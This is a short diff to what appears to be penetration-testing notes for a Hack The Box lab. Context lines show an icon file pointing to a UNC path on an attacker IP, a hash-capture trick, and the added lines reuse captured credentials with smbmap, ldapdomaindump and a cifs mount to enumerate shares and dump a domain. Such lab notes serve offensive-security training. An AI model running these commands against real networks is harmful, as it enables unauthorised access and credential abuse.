@@ -148,3 +148,10 @@ IconFile=\\192.168.162.46\share\fav.ico
 Command=ToggleDesktop 
 
 
+===================================  
+Found Creds - Reuse them 
+
+smbmap -H 10.10.10.103 -u bob -p paxxword
+ldapdomaindump -u 'htb.local\bob' -p paxxword 192.168.200.5 -o ~/lab/ldap/ 
+mount -t cifs -o username=bob,password=paxxword "//192.168.200.5/CertEnroll" /mnt/ds 
+ls -l mnt/ds/ 
